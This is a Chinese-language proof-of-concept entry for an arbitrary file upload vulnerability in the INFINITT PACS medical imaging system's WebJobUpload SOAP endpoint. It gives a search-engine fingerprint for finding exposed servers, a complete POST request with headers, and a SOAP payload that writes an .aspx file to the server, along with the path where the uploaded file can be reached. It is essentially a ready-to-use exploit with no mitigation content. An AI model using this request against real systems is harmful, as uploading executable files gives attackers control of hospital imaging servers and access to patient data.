# 英飞达影像存档与通讯(PACS)系统INFINITTPACSWebJobUpload存在任意文件上传漏洞

- **系统**：英飞达影像存档与通讯(PACS)系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.icon="0cd46e0cba3abd067cd28e70eb7f2a5f"`
- **请求**：`POST /webservices/WebJobUpload.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://rainier/jobUpload"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>2.aspx</fileName>
<bufValue>MTIz</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
/1/2.aspx
```

**其他**
- 英飞达影像存档与通讯(PACS)系统INFINITT PACS WebJobUpload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 英飞达影像存档与通讯(PACS)系统INFINITT PACS